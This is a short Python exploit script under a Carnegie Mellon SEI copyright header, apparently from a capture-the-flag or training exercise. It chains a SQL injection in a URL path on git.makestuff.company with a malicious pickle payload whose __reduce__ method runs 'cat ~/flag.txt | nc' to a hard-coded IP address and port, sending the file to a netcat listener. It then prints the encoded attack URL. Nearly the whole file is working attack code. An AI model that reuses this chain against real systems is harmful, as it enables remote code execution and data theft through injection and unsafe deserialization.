
# Copyright 2022 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.

import os
import pickle
import urllib.parse

IP_ADDRESS = "172.16.20.34"
NC_PORT = "12345"

sql_cmd = b"UPDATE data SET seed_data = '\\x%s'::bytea WHERE id = 1"
url_part1 = "git.makestuff.company:5000/run/100/'nothing%27,200,%27blah%27%29;%20"
url_part2 = "%3B--'"

class Exploit:
    def __reduce__(self):
        cmd = f"cat ~/flag.txt | nc {IP_ADDRESS} {NC_PORT}"
        return os.system, (cmd,)

def main():
    p = pickle.dumps(Exploit())
    exploit = sql_cmd % p.hex().encode()
    encoded_exploit = urllib.parse.quote(exploit)
    print(url_part1 + encoded_exploit + url_part2)

main()

